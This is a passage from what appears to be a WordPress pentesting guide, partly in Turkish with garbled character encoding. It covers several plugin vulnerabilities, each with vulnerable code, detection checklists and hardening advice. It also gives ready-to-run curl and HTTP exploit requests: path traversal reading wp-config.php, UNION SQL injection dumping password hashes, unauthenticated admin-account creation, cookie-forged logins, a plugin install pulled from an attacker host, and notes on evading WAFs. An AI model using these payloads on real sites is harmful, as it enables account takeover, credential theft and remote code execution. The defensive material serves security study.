* Dosya sistemi yardÄ±mcÄ±larÄ±nÄ± (`copy()`, `unlink()`, `$wp_filesystem->delete()`, vb.) Ã§aÄŸÄ±ran herhangi bir `add_action( 'wp_ajax_nopriv_...')` callback'i.
* KullanÄ±cÄ± girdisinin temizlenmeden yollarla birleÅŸtirilmesi (bakÄ±lacaklar: `$_POST`, `$_GET`, `$_REQUEST`).
* `check_ajax_referer()` ve `current_user_can()`/`is_user_logged_in()`'in yokluÄŸu.

---

### Privilege escalation via stale role restoration and missing authorization (ASE "View Admin as Role")

Many plugins implement a "view as role" or temporary role-switching feature by saving the original role(s) in user meta so they can be restored later. If the restoration path relies only on request parameters (e.g., `$_REQUEST['reset-for']`) and a plugin-maintained list without checking capabilities and a valid nonce, this becomes a vertical privilege escalation.

A real-world example was found in the Admin and Site Enhancements (ASE) plugin (â‰¤ 7.6.2.1). The reset branch restored roles based on `reset-for=<username>` if the username appeared in an internal array `$options['viewing_admin_as_role_are']`, but performed neither a `current_user_can()` check nor a nonce verification before removing current roles and re-adding the saved roles from user meta `_asenha_view_admin_as_original_roles`:
```php
// Simplified vulnerable pattern
if ( isset( $_REQUEST['reset-for'] ) ) {
$reset_for_username = sanitize_text_field( $_REQUEST['reset-for'] );
$usernames = get_option( ASENHA_SLUG_U, [] )['viewing_admin_as_role_are'] ?? [];

if ( in_array( $reset_for_username, $usernames, true ) ) {
$u = get_user_by( 'login', $reset_for_username );
foreach ( $u->roles as $role ) { $u->remove_role( $role ); }
$orig = (array) get_user_meta( $u->ID, '_asenha_view_admin_as_original_roles', true );
foreach ( $orig as $r ) { $u->add_role( $r ); }
}
}
```
Neden istismar edilebilir

- Sunucu tarafÄ± yetkilendirmesi olmadan `$_REQUEST['reset-for']` ve bir eklenti seÃ§eneÄŸine gÃ¼venir.
- EÄŸer bir kullanÄ±cÄ±nÄ±n daha Ã¶nce `_asenha_view_admin_as_original_roles` iÃ§inde daha yÃ¼ksek ayrÄ±calÄ±klarÄ± kaydedilmiÅŸse ve sonra yetkileri dÃ¼ÅŸÃ¼rÃ¼lmÃ¼ÅŸse, reset yolunu tetikleyerek bunlarÄ± geri getirebilir.
- BazÄ± daÄŸÄ±tÄ±mlarda, kimliÄŸi doÄŸrulanmÄ±ÅŸ herhangi bir kullanÄ±cÄ±, `viewing_admin_as_role_are` iÃ§inde hÃ¢lÃ¢ bulunan baÅŸka bir kullanÄ±cÄ± adÄ± iÃ§in reset tetikleyebilir (bozuk yetkilendirme).

Ä°stismar (Ã¶rnek)
```bash
# While logged in as the downgraded user (or any auth user able to trigger the code path),
# hit any route that executes the role-switcher logic and include the reset parameter.
# The plugin uses $_REQUEST, so GET or POST works. The exact route depends on the plugin hooks.
curl -s -k -b 'wordpress_logged_in=...' \
'https://victim.example/wp-admin/?reset-for=<your_username>'
```
ZayÄ±f yapÄ±landÄ±rmalarda bu mevcut rolleri kaldÄ±rÄ±r ve kaydedilmiÅŸ orijinal rolleri (Ã¶r. `administrator`) yeniden ekler; bu da etkin olarak ayrÄ±calÄ±k yÃ¼kseltmeye yol aÃ§ar.

Detection checklist

- Look for role-switching features that persist â€œoriginal rolesâ€ in user meta (e.g., `_asenha_view_admin_as_original_roles`).
- Identify reset/restore paths that:
- KullanÄ±cÄ± adlarÄ±nÄ± `$_REQUEST` / `$_GET` / `$_POST`'ten okuyan.
- `current_user_can()` ve `wp_verify_nonce()` / `check_admin_referer()` olmadan `add_role()` / `remove_role()` ile rolleri deÄŸiÅŸtiren.
- Yetkilendirmeyi aktÃ¶rÃ¼n capabilities yerine bir plugin option dizisine (Ã¶r. `viewing_admin_as_role_are`) dayandÄ±ran.

---

### Kamusal init Ã¼zerinde Ã§erez-tabanlÄ± kullanÄ±cÄ± deÄŸiÅŸtirme ile kimlik doÄŸrulanmamÄ±ÅŸ ayrÄ±calÄ±k yÃ¼kseltmesi (Service Finder â€œsf-bookingâ€)

BazÄ± pluginler user-switching yardÄ±mcÄ±larÄ±nÄ± public `init` hook'una baÄŸlar ve kimliÄŸi client tarafÄ±ndan kontrol edilen bir Ã§erezden tÃ¼retir. EÄŸer kod `wp_set_auth_cookie()`'i kimlik doÄŸrulamayÄ±, capability ve geÃ§erli bir nonce'u doÄŸrulamadan Ã§aÄŸÄ±rÄ±yorsa, herhangi bir kimlik doÄŸrulanmamÄ±ÅŸ ziyaretÃ§i rastgele bir kullanÄ±cÄ± ID'si olarak oturum aÃ§mayÄ± zorlayabilir.

Tipik zafiyetli desen (Service Finder Bookings â‰¤ 6.1'den sadeleÅŸtirilmiÅŸ):
```php
function service_finder_submit_user_form(){
if ( isset($_GET['switch_user']) && is_numeric($_GET['switch_user']) ) {
$user_id = intval( sanitize_text_field($_GET['switch_user']) );
service_finder_switch_user($user_id);
}
if ( isset($_GET['switch_back']) ) {
service_finder_switch_back();
}
}
add_action('init', 'service_finder_submit_user_form');

function service_finder_switch_back() {
if ( isset($_COOKIE['original_user_id']) ) {
$uid = intval($_COOKIE['original_user_id']);
if ( get_userdata($uid) ) {
wp_set_current_user($uid);
wp_set_auth_cookie($uid);  // ğŸ”¥ sets auth for attacker-chosen UID
do_action('wp_login', get_userdata($uid)->user_login, get_userdata($uid));
setcookie('original_user_id', '', time() - 3600, '/');
wp_redirect( admin_url('admin.php?page=candidates') );
exit;
}
wp_die('Original user not found.');
}
wp_die('No original user found to switch back to.');
}
```
Neden istismar edilebilir

- Genel `init` hook, iÅŸleyiciyi kimlik doÄŸrulanmamÄ±ÅŸ kullanÄ±cÄ±larÄ±n eriÅŸimine aÃ§ar (hiÃ§bir `is_user_logged_in()` korumasÄ± yok).
- Kimlik, istemci tarafÄ±ndan deÄŸiÅŸtirilebilen bir Ã§erezden (`original_user_id`) tÃ¼retilir.
- `wp_set_auth_cookie($uid)`'nin doÄŸrudan Ã§aÄŸrÄ±sÄ±, istekte bulunanÄ± herhangi bir capability/nonce kontrolÃ¼ olmadan o kullanÄ±cÄ± olarak oturum aÃ§tÄ±rÄ±r.

Ä°stismar (kimlik doÄŸrulanmamÄ±ÅŸ)
```http
GET /?switch_back=1 HTTP/1.1
Host: victim.example
Cookie: original_user_id=1
User-Agent: PoC
Connection: close
```
---

### WordPress/plugin CVEs iÃ§in WAF ile ilgili hususlar

Genel edge/server WAF'larÄ± geniÅŸ desenlere gÃ¶re ayarlanmÄ±ÅŸtÄ±r (SQLi, XSS, LFI). BirÃ§ok yÃ¼ksek etkili WordPress/plugin zafiyeti, motor WordPress rotalarÄ±nÄ± ve plugin semantics'ini anlamadÄ±ÄŸÄ± sÃ¼rece zararsÄ±z trafik gibi gÃ¶rÃ¼nen uygulamaya-Ã¶zgÃ¼ mantÄ±k/auth hatalarÄ±dÄ±r.

SaldÄ±rÄ± notlarÄ±

- Temiz payload'larla plugin-Ã¶zgÃ¼ endpoint'leri hedefleyin: `admin-ajax.php?action=...`, `wp-json/<namespace>/<route>`, custom file handlers, shortcodes.
- Ã–nce unauth yollarÄ±nÄ± test edin (AJAX `nopriv`, REST with permissive `permission_callback`, public shortcodes). VarsayÄ±lan payload'lar genellikle obfuscation olmadan baÅŸarÄ±lÄ± olur.
- Tipik yÃ¼ksek etkili vakalar: privilege escalation (broken access control), arbitrary file upload/download, LFI, open redirect.

Savunma notlarÄ±

- Plugin CVEs'i korumak iÃ§in genel WAF imzalarÄ±na gÃ¼venmeyin. Uygulama-katmanÄ±, zafiyete-Ã¶zel virtual patch'ler uygulayÄ±n veya hÄ±zlÄ±ca gÃ¼ncelleyin.
- Kodda negative regex filtreleri yerine positive-security kontrollerini tercih edin (capabilities, nonces, strict input validation).

## WordPress KorumasÄ±

### DÃ¼zenli GÃ¼ncellemeler

WordPress, plugins ve themes'in gÃ¼ncel olduÄŸundan emin olun. AyrÄ±ca otomatik gÃ¼ncellemenin wp-config.php iÃ§inde etkinleÅŸtirildiÄŸini doÄŸrulayÄ±n:
```bash
define( 'WP_AUTO_UPDATE_CORE', true );
add_filter( 'auto_update_plugin', '__return_true' );
add_filter( 'auto_update_theme', '__return_true' );
```
AyrÄ±ca, **sadece gÃ¼venilir WordPress eklentileri ve temalarÄ± yÃ¼kleyin**.

### GÃ¼venlik Eklentileri

- [**Wordfence Security**](https://wordpress.org/plugins/wordfence/)
- [**Sucuri Security**](https://wordpress.org/plugins/sucuri-scanner/)
- [**iThemes Security**](https://wordpress.org/plugins/better-wp-security/)

### **DiÄŸer Ã–neriler**

- VarsayÄ±lan **admin** kullanÄ±cÄ±sÄ±nÄ± kaldÄ±rÄ±n
- **GÃ¼Ã§lÃ¼ parolalar** ve **2FA** kullanÄ±n
- KullanÄ±cÄ±larÄ±n **izinlerini** periyodik olarak **gÃ¶zden geÃ§irin**
- Brute Force saldÄ±rÄ±larÄ±nÄ± Ã¶nlemek iÃ§in **giriÅŸ denemelerini sÄ±nÄ±rlayÄ±n**
- **`wp-admin.php`** dosyasÄ±nÄ±n adÄ±nÄ± deÄŸiÅŸtirin ve eriÅŸime yalnÄ±zca iÃ§ aÄŸdan veya belirli IP adreslerinden izin verin.


### Kimlik doÄŸrulama gerektirmeyen SQL Injection (yetersiz doÄŸrulama nedeniyle) (WP Job Portal <= 2.3.2)

WP Job Portal iÅŸe alÄ±m eklentisi, sonuÃ§ta `modules/category/model.php::validateFormData()` iÃ§inde aÅŸaÄŸÄ±daki savunmasÄ±z kodu Ã§alÄ±ÅŸtÄ±ran **savecategory** gÃ¶revini aÃ§Ä±ÄŸa Ã§Ä±kardÄ±:
```php
$category  = WPJOBPORTALrequest::getVar('parentid');
$inquery   = ' ';
if ($category) {
$inquery .= " WHERE parentid = $category ";   // <-- direct concat âœ—
}
$query  = "SELECT max(ordering)+1 AS maxordering FROM "
. wpjobportal::$_db->prefix . "wj_portal_categories " . $inquery; // executed later
```
Issues introduced by this snippet:

1. **Unsanitised user input** â€“ `parentid` comes straight from the HTTP request.
2. **String concatenation inside the WHERE clause** â€“ no `is_numeric()` / `esc_sql()` / prepared statement.
3. **Unauthenticated reachability** â€“ although the action is executed through `admin-post.php`, the only check in place is a **CSRF nonce** (`wp_verify_nonce()`), which any visitor can retrieve from a public page embedding the shortcode `[wpjobportal_my_resumes]`.

#### Ä°stismar

1. Taze bir nonce alÄ±n:
```bash
curl -s https://victim.com/my-resumes/ | grep -oE 'name="_wpnonce" value="[a-f0-9]+' | cut -d'"' -f4
```
2. `parentid`'i kÃ¶tÃ¼ye kullanarak rastgele SQL enjekte edin:
```bash
curl -X POST https://victim.com/wp-admin/admin-post.php \
-d 'task=savecategory' \
-d '_wpnonce=<nonce>' \
-d 'parentid=0 OR 1=1-- -' \
-d 'cat_title=pwn' -d 'id='
```
The response discloses the result of the injected query or alters the database, proving SQLi.


### Unauthenticated Arbitrary File Download / Path Traversal (WP Job Portal <= 2.3.2)

Another task, **downloadcustomfile**, allowed visitors to download **any file on disk** via path traversal.  The vulnerable sink is located in `modules/customfield/model.php::downloadCustomUploadedFile()`:
```php
$file = $path . '/' . $file_name;
...
echo $wp_filesystem->get_contents($file); // raw file output
```
`$file_name` attacker-controlled ve **temizlenmeden** birleÅŸtiriliyor. Tekrar, tek engel resume sayfasÄ±ndan alÄ±nabilecek bir **CSRF nonce**.

#### Exploitation
```bash
curl -G https://victim.com/wp-admin/admin-post.php \
--data-urlencode 'task=downloadcustomfile' \
--data-urlencode '_wpnonce=<nonce>' \
--data-urlencode 'upload_for=resume' \
--data-urlencode 'entity_id=1' \
--data-urlencode 'file_name=../../../wp-config.php'
```
Sunucu `wp-config.php` iÃ§eriÄŸi ile yanÄ±t veriyor, leaking DB credentials and auth keys.

## Unauthenticated account takeover via Social Login AJAX fallback (Jobmonster Theme <= 4.7.9)

BirÃ§ok tema/eklentide admin-ajax.php Ã¼zerinden eriÅŸilebilen "social login" yardÄ±mcÄ±larÄ± bulunur. EÄŸer bir unauthenticated AJAX action (wp_ajax_nopriv_...) saÄŸlayÄ±cÄ± verisi eksik olduÄŸunda client-supplied identifiers'a gÃ¼venip wp_set_auth_cookie() Ã§aÄŸÄ±rÄ±yorsa, bu tam bir authentication bypass'a dÃ¶nÃ¼ÅŸÃ¼r.

Tipik hatalÄ± desen (basitleÅŸtirilmiÅŸ)
```php
public function check_login() {
// ... request parsing ...
switch ($_POST['using']) {
case 'fb':     /* set $user_email from verified Facebook token */ break;
case 'google': /* set $user_email from verified Google token   */ break;
// other providers ...
default: /* unsupported/missing provider â€“ execution continues */ break;
}

// FALLBACK: trust POSTed "id" as email if provider data missing
$user_email = !empty($user_email)
? $user_email
: (!empty($_POST['id']) ? esc_attr($_POST['id']) : '');

if (empty($user_email)) {
wp_send_json(['status' => 'not_user']);
}

$user = get_user_by('email', $user_email);
if ($user) {
wp_set_auth_cookie($user->ID, true); // ğŸ”¥ logs requester in as that user
wp_send_json(['status' => 'success', 'message' => 'Login successfully.']);
}
wp_send_json(['status' => 'not_user']);
}
// add_action('wp_ajax_nopriv_<social_login_action>', [$this, 'check_login']);
```
Why itâ€™s exploitable

- Kimlik doÄŸrulamasÄ± olmadan admin-ajax.php Ã¼zerinden eriÅŸim (wp_ajax_nopriv_â€¦ action).
- Durum deÄŸiÅŸikliÄŸinden Ã¶nce nonce/capability kontrolleri yok.
- OAuth/OpenID saÄŸlayÄ±cÄ± doÄŸrulamasÄ± eksik; varsayÄ±lan dal saldÄ±rgan girdisini kabul ediyor.
- get_user_by('email', $_POST['id'])'in ardÄ±ndan wp_set_auth_cookie($uid) Ã§aÄŸrÄ±sÄ±, isteÄŸi yapanÄ± mevcut herhangi bir e-posta adresi olarak doÄŸrular.

Exploitation (unauthenticated)

- Prerequisites: saldÄ±rgan /wp-admin/admin-ajax.php'ye eriÅŸebilmeli ve geÃ§erli bir kullanÄ±cÄ± e-postasÄ±nÄ± bilmeli/tahmin edebilmeli.
- Set provider to an unsupported value (or omit it) to hit the default branch and pass id=<victim_email>.
```http
POST /wp-admin/admin-ajax.php HTTP/1.1
Host: victim.tld
Content-Type: application/x-www-form-urlencoded

action=<vulnerable_social_login_action>&using=bogus&id=admin%40example.com
```

```bash
curl -i -s -X POST https://victim.tld/wp-admin/admin-ajax.php \
-d "action=<vulnerable_social_login_action>&using=bogus&id=admin%40example.com"
```
Expected success indicators

- HTTP 200 with JSON body like {"status":"success","message":"Login successfully."}.
- Set-Cookie: wordpress_logged_in_* for the victim user; subsequent requests are authenticated.

Finding the action name

- Inspect the theme/plugin for add_action('wp_ajax_nopriv_...', '...') registrations in social login code (e.g., framework/add-ons/social-login/class-social-login.php).
- Grep for wp_set_auth_cookie(), get_user_by('email', ...) inside AJAX handlers.

Detection checklist

- Web logs showing unauthenticated POSTs to /wp-admin/admin-ajax.php with the social-login action and id=<email>.
- 200 responses with the success JSON immediately preceding authenticated traffic from the same IP/User-Agent.

Hardening

- Do not derive identity from client input. Only accept emails/IDs originating from a validated provider token/ID.
- Require CSRF nonces and capability checks even for login helpers; avoid registering wp_ajax_nopriv_ unless strictly necessary.
- Validate and verify OAuth/OIDC responses server-side; reject missing/invalid providers (no fallback to POST id).
- Consider temporarily disabling social login or virtually patching at the edge (block the vulnerable action) until fixed.

Patched behaviour (Jobmonster 4.8.0)

- Removed the insecure fallback from $_POST['id']; $user_email must originate from verified provider branches in switch($_POST['using']).

## Unauthenticated privilege escalation via REST token/key minting on predictable identity (OttoKit/SureTriggers â‰¤ 1.0.82)

Some plugins expose REST endpoints that mint reusable â€œconnection keysâ€ or tokens without verifying the callerâ€™s capabilities. If the route authenticates only on a guessable attribute (e.g., username) and does not bind the key to a user/session with capability checks, any unauthenticated attacker can mint a key and invoke privileged actions (admin account creation, plugin actions â†’ RCE).

- Vulnerable route (example): sure-triggers/v1/connection/create-wp-connection
- Flaw: accepts a username, issues a connection key without current_user_can() or a strict permission_callback
- Impact: full takeover by chaining the minted key to internal privileged actions

PoC â€“ mint a connection key and use it
```bash
# 1) Obtain key (unauthenticated). Exact payload varies per plugin
curl -s -X POST "https://victim.tld/wp-json/sure-triggers/v1/connection/create-wp-connection" \
-H 'Content-Type: application/json' \
--data '{"username":"admin"}'
# â†’ {"key":"<conn_key>", ...}

# 2) Call privileged plugin action using the minted key (namespace/route vary per plugin)
curl -s -X POST "https://victim.tld/wp-json/sure-triggers/v1/users" \
-H 'Content-Type: application/json' \
-H 'X-Connection-Key: <conn_key>' \
--data '{"username":"pwn","email":"p@t.ld","password":"p@ss","role":"administrator"}'
```
Neden istismar edilebilir
- DuyarlÄ± REST rota yalnÄ±zca dÃ¼ÅŸÃ¼k-entropili kimlik kanÄ±tÄ± (username) ile korunuyor veya permission_callback eksik
- Yetki denetimi yok; oluÅŸturulan anahtar evrensel bir baypas olarak kabul ediliyor

Tespit kontrol listesi
- Plugin kodunda register_rest_route(..., [ 'permission_callback' => '__return_true' ]) iÃ§in grep yapÄ±n
- Ä°stekle saÄŸlanan kimliÄŸe (username/email) dayalÄ± token/anahtar veren ve bunu doÄŸrulanmÄ±ÅŸ bir kullanÄ±cÄ±ya veya yetkiye baÄŸlamayan herhangi bir rota
- OluÅŸturulan token/anahtarÄ± sunucu tarafÄ± yetki kontrolleri olmadan kabul eden sonraki rotalarÄ± arayÄ±n

SertleÅŸtirme
- Her ayrÄ±calÄ±klÄ± REST rotasÄ± iÃ§in: gerekli yetkiyi current_user_can() ile denetleyen bir permission_callback zorunlu kÄ±lÄ±n
- Ä°stemci tarafÄ±ndan saÄŸlanan kimlikten uzun Ã¶mÃ¼rlÃ¼ anahtar oluÅŸturmayÄ±n; gerekirse, kimlik doÄŸrulamadan sonra kÄ±sa Ã¶mÃ¼rlÃ¼, kullanÄ±cÄ±-baÄŸlÄ± tokenlar verin ve kullanÄ±mda yetkileri yeniden kontrol edin
- Ã‡aÄŸÄ±ranÄ±n kullanÄ±cÄ± baÄŸlamÄ±nÄ± doÄŸrulayÄ±n (wp_set_current_user tek baÅŸÄ±na yeterli deÄŸildir) ve !is_user_logged_in() || !current_user_can(<cap>) olan istekleri reddedin

---

## Nonce kapÄ±sÄ± kÃ¶tÃ¼ye kullanÄ±mÄ± â†’ kimliÄŸi doÄŸrulanmamÄ±ÅŸ rastgele plugin kurulumu (FunnelKit Automations â‰¤ 3.5.3)

Nonces CSRF'i engeller, yetkilendirmeyi deÄŸil. EÄŸer kod bir nonce geÃ§iÅŸini yeÅŸil Ä±ÅŸÄ±k olarak deÄŸerlendirip ayrÄ±calÄ±klÄ± iÅŸlemler iÃ§in yetki kontrollerini atlÄ±yorsa (Ã¶r. install/activate plugins), kimliÄŸi doÄŸrulanmamÄ±ÅŸ saldÄ±rganlar zayÄ±f bir nonce gereksinimini karÅŸÄ±layÄ±p arka kapÄ±lÄ± veya zayÄ±f bir plugin yÃ¼kleyerek RCE'ye ulaÅŸabilir.

- Vulnerable path: plugin/install_and_activate
- Hata: zayÄ±f nonce hash kontrolÃ¼; nonce â€œpassesâ€ olduktan sonra current_user_can('install_plugins'|'activate_plugins') yok
- Etki: rastgele plugin kurulumu/aktivasyonu ile tam kontrol ele geÃ§irilmesi

PoC (ÅŸekli plugin'e baÄŸlÄ±dÄ±r; yalnÄ±zca Ã¶rnek amaÃ§lÄ±)
```bash
curl -i -s -X POST https://victim.tld/wp-json/<fk-namespace>/plugin/install_and_activate \
-H 'Content-Type: application/json' \
--data '{"_nonce":"<weak-pass>","slug":"hello-dolly","source":"https://attacker.tld/mal.zip"}'
```
Detection checklist
- REST/AJAX handlers that modify plugins/themes with only wp_verify_nonce()/check_admin_referer() and no capability check
- Any code path that sets $skip_caps = true after nonce validation

Hardening
- Always treat nonces as CSRF tokens only; enforce capability checks regardless of nonce state
- Require current_user_can('install_plugins') and current_user_can('activate_plugins') before reaching installer code
- Reject unauthenticated access; avoid exposing nopriv AJAX actions for privileged flows

---

## Unauthenticated SQLi via s search parameter in depicter-* actions (Depicter Slider â‰¤ 3.6.1)

Birden fazla depicter-* action, s (search) parametresini aldÄ± ve bunu parameterization olmadan SQL queries iÃ§ine doÄŸrudan birleÅŸtirdi.

- Parametre: s (search)
- Hata: WHERE/LIKE ifadelerinde doÄŸrudan string concatenation; prepared statements/sanitization yok
- Etki: database exfiltration (users, hashes), lateral movement

PoC
```bash
# Replace action with the affected depicter-* handler on the target
curl -G "https://victim.tld/wp-admin/admin-ajax.php" \
--data-urlencode 'action=depicter_search' \
--data-urlencode "s=' UNION SELECT user_login,user_pass FROM wp_users-- -"
```
Detection checklist
- depicter-* action handler'larÄ± iÃ§in grep yapÄ±n ve SQL iÃ§inde $_GET['s'] veya $_POST['s']'in doÄŸrudan kullanÄ±mÄ±nÄ± arayÄ±n
- s ile birleÅŸtirilen Ã¶zel sorgularÄ± $wpdb->get_results()/query()'e geÃ§irilenleri inceleyin

Hardening
- Always use $wpdb->prepare() or wpdb placeholders; sunucu tarafÄ±nda beklenmeyen metakarakterleri reddedin
- s iÃ§in sÄ±kÄ± bir allowlist ekleyin ve beklenen charset/uzunluÄŸa normalize edin

---

## Kimlik doÄŸrulamasÄ±z Local File Inclusion, doÄŸrulanmamÄ±ÅŸ template/file path aracÄ±lÄ±ÄŸÄ±yla (Kubio AI Page Builder â‰¤ 2.5.1)

Template parametresinde normalizasyon veya sÄ±nÄ±rlama olmadan saldÄ±rgan kontrollÃ¼ path'lerin kabul edilmesi, rastgele yerel dosyalarÄ±n okunmasÄ±na izin verir ve includable PHP/log dosyalarÄ± runtime'a dahil edilirse bazen kod yÃ¼rÃ¼tmeye yol aÃ§abilir.

- Parameter: __kubio-site-edit-iframe-classic-template
- Flaw: normalizasyon/allowlisting yok; traversal'a izin veriliyor
- Impact: gizli bilgi ifÅŸasÄ± (wp-config.php), belirli ortamlarda potansiyel RCE (log poisoning, includable PHP)

PoC â€“ read wp-config.php
```bash
curl -i "https://victim.tld/?__kubio-site-edit-iframe-classic-template=../../../../wp-config.php"
```
Tespit kontrol listesi
- Ä°stek yollarÄ±nÄ± include()/require()/read sinks iÃ§ine realpath() containment olmadan birleÅŸtiren herhangi bir handler
- AmaÃ§lanan templates dizininin dÄ±ÅŸÄ±na Ã§Ä±kan traversal desenleri (../) arayÄ±n

SertleÅŸtirme
- Ä°zin verilen (allowlisted) templates'i zorunlu kÄ±lÄ±n; realpath() ile Ã§Ã¶zÃ¼n ve str_starts_with(realpath(file), realpath(allowed_base)) gerektirin
- Girdiyi normalize edin; traversal dizilerini ve mutlak yollarÄ± reddedin; sanitize_file_name()'Ä± yalnÄ±zca dosya adlarÄ± iÃ§in kullanÄ±n (tam yollar iÃ§in deÄŸil)


## Kaynaklar

- [Unauthenticated Arbitrary File Deletion Vulnerability in Litho Theme](https://patchstack.com/articles/unauthenticated-arbitrary-file-delete-vulnerability-in-litho-the/)
- [Multiple Critical Vulnerabilities Patched in WP Job Portal Plugin](https://patchstack.com/articles/multiple-critical-vulnerabilities-patched-in-wp-job-portal-plugin/)
- [Rare Case of Privilege Escalation in ASE Plugin Affecting 100k+ Sites](https://patchstack.com/articles/rare-case-of-privilege-escalation-in-ase-plugin-affecting-100k-sites/)
- [ASE 7.6.3 changeset â€“ delete original roles on profile update](https://plugins.trac.wordpress.org/changeset/3211945/admin-site-enhancements/tags/7.6.3/classes/class-view-admin-as-role.php?old=3208295&old_path=admin-site-enhancements%2Ftags%2F7.6.2%2Fclasses%2Fclass-view-admin-as-role.php)
- [Hosting security tested: 87.8% of vulnerability exploits bypassed hosting defenses](https://patchstack.com/articles/hosting-security-tested-87-percent-of-vulnerability-exploits-bypassed-hosting-defenses/)
- [WooCommerce Payments â‰¤ 5.6.1 â€“ Unauth privilege escalation via trusted header (Patchstack DB)](https://patchstack.com/database/wordpress/plugin/woocommerce-payments/vulnerability/wordpress-woocommerce-payments-plugin-5-6-1-unauthenticated-privilege-escalation-vulnerability)
- [Hackers exploiting critical WordPress WooCommerce Payments bug](https://www.bleepingcomputer.com/news/security/hackers-exploiting-critical-wordpress-woocommerce-payments-bug/)
- [Unpatched Privilege Escalation in Service Finder Bookings Plugin](https://patchstack.com/articles/unpatched-privilege-escalation-in-service-finder-bookings-plugin/)
- [Service Finder Bookings privilege escalation â€“ Patchstack DB entry](https://patchstack.com/database/wordpress/plugin/sf-booking/vulnerability/wordpress-service-finder-booking-6-0-privilege-escalation-vulnerability)
- [Unauthenticated Broken Authentication Vulnerability in WordPress Jobmonster Theme](https://patchstack.com/articles/unauthenticated-broken-authentication-vulnerability-in-wordpress-jobmonster-theme/)
- [Q3 2025â€™s most exploited WordPress vulnerabilities and how RapidMitigate blocked them](https://patchstack.com/articles/q3-2025s-most-exploited-wordpress-vulnerabilities-and-how-patchstacks-rapidmitigate-blocked-them/)
- [OttoKit (SureTriggers) â‰¤ 1.0.82 â€“ Privilege Escalation (Patchstack DB)](https://patchstack.com/database/wordpress/plugin/suretriggers/vulnerability/wordpress-suretriggers-1-0-82-privilege-escalation-vulnerability)
- [FunnelKit Automations â‰¤ 3.5.3 â€“ Unauthenticated arbitrary plugin installation (Patchstack DB)](https://patchstack.com/database/wordpress/plugin/wp-marketing-automations/vulnerability/wordpress-recover-woocommerce-cart-abandonment-newsletter-email-marketing-marketing-automation-by-funnelkit-plugin-3-5-3-missing-authorization-to-unauthenticated-arbitrary-plugin-installation-vulnerability)
- [Depicter Slider â‰¤ 3.6.1 â€“ Unauthenticated SQLi via s parameter (Patchstack DB)](https://patchstack.com/database/wordpress/plugin/depicter/vulnerability/wordpress-depicter-slider-plugin-3-6-1-unauthenticated-sql-injection-via-s-parameter-vulnerability)
- [Kubio AI Page Builder â‰¤ 2.5.1 â€“ Unauthenticated LFI (Patchstack DB)](https://patchstack.com/database/wordpress/plugin/kubio/vulnerability/wordpress-kubio-ai-page-builder-plugin-2-5-1-unauthenticated-local-file-inclusion-vulnerability)

{{#include ../../banners/hacktricks-training.md}}
